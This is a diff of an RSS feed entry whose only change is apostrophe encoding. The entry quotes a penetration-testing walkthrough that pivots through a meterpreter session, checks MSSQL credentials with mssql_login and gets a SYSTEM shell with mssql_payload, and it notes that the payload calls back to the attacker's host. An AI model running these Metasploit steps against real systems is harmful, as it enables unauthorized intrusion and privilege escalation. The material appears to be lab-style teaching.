@@ -66,7 +66,7 @@ Active Routing Table
 Subnet  Netmask  Gateway
 ------  -------  -------
 192.168.56.0  255.255.255.0  Session 1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then we use mssql_login to check to see if our creds are right (set BLANK_PASSWORDS to false since we already know the password and we aren&#39;t trying to brute force it). This will be routed through our meterpreter session that has NETWORK SERVICE permissions.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then we use mssql_login to check to see if our creds are right (set BLANK_PASSWORDS to false since we already know the password and we aren&amp;rsquo;t trying to brute force it). This will be routed through our meterpreter session that has NETWORK SERVICE permissions.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msf exploit(handler) &amp;gt; use scanner/mssql/mssql_login
 msf auxiliary(mssql_login) &amp;gt; set BLANK_PASSWORDS false
 BLANK_PASSWORDS =&amp;gt; false
@@ -156,7 +156,7 @@ msf exploit(mssql_payload) &amp;gt; sessions -i 2
 meterpreter &amp;gt; getuid
 Server username: NT AUTHORITY\SYSTEM
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Game over..&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Note: Routing only sends the module(be it exploit or aux) through the session. Once the payload runs (for exploit modules), it&#39;s is calling straight back to the LHOST (Attacker box), not through the session. So, in this example you can now exit session 1 (NETWORK SERVICE) as it&#39;s not really needed any more.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note: Routing only sends the module(be it exploit or aux) through the session. Once the payload runs (for exploit modules), it&amp;rsquo;s is calling straight back to the LHOST (Attacker box), not through the session. So, in this example you can now exit session 1 (NETWORK SERVICE) as it&amp;rsquo;s not really needed any more.&lt;/strong&gt;&lt;/p&gt;
 </description>
     </item>
     
